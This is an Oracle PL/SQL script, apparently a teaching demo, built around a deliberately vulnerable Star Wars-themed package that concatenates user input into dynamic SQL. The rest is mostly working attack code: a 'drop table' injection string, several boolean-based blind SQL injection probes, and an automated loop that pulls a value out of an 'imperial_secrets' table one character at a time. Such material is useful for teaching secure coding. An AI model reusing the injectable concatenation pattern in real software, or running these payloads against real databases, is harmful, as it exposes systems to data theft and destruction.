/* package to get Room-name by ID
 */
create or replace package room_info as
  function get_room_id( i_name varchar2 ) return integer;
end;
/
create or replace package body room_info as
  function get_room_id( i_name varchar2 ) return integer
  as
    c_curs sys_refcursor;
    v_row deathstar_rooms%rowtype;
    l_id integer;
    begin
      open c_curs for
        'select * from deathstar_rooms where lower(name) like lower(''%' || i_name || '%'')';

      loop
	      fetch c_curs into v_row;
	      exit when c_curs%notfound or l_id is not null;
	      dbms_output.put_line('Room found: ' || v_row.name);
	      l_id := v_row.id;
      end loop;

      return l_id;
    end;
end;
/

select room_info.get_room_id('Vader') from dual;

-- Funktioniert nicht, weil nur 1 Statement + Read-context
select room_info.get_room_id('''); drop table deathstar_rooms;--') from dual;


select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') from dual;
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''b'') --') from dual;
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''c'') --') from dual;

-- all ascii chars...
select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''v'') --') from dual;

declare
  l_secret varchar2(4000);

  function chk_char(i_idx integer)
    return varchar2
  as
    l_malicious_stmt varchar2(4000);
  begin
    for char_ascii in 1..90
      loop
        l_malicious_stmt :=
            ''') and exists(select 1 from imperial_secrets where id = 1 and' ||
            ' lower(substr(secret, ' || i_idx || ', 1)) = ''' || lower(chr(char_ascii)) || ''') --';
        --dbms_output.put_line(l_malicious_stmt);
        if (room_info.get_room_id(l_malicious_stmt) = 1) then
          return chr(char_ascii);
        end if;
      end loop;
    return '?';
  end;
begin
  begin
    for idx in 1..30
      loop
        l_secret := l_secret || chk_char(idx);
      end loop;
  exception
    when others then
      dbms_output.put_line(sqlerrm);
  end;
  dbms_output.put_line('Secret: ' || l_secret);
end;
/

